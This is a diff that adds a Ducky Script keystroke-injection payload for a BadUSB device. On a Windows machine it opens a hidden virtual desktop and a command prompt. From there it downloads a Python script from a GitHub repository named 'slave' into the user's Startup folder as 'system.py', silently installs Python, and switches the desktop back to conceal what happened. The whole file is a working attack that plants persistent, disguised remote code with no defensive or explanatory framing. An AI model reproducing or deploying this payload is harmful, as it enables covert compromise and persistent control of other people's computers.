@@ -1,0 +1,11 @@
+DELAY 2000
+GUI CTRL D
+DELAY 200
+GUI r
+DELAY 200
+STRING cmd
+ENTER
+DELAY 500
+STRING curl https://raw.githubusercontent.com/liverfried/slave/9ca2015b6be440efd2fdaf079443112e3a07928f/main.py >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\system.py" && winget install --accept-source-agreements --accept-package-agreements python && pip install time && exit
+ENTER
+GUI CTRL LEFT
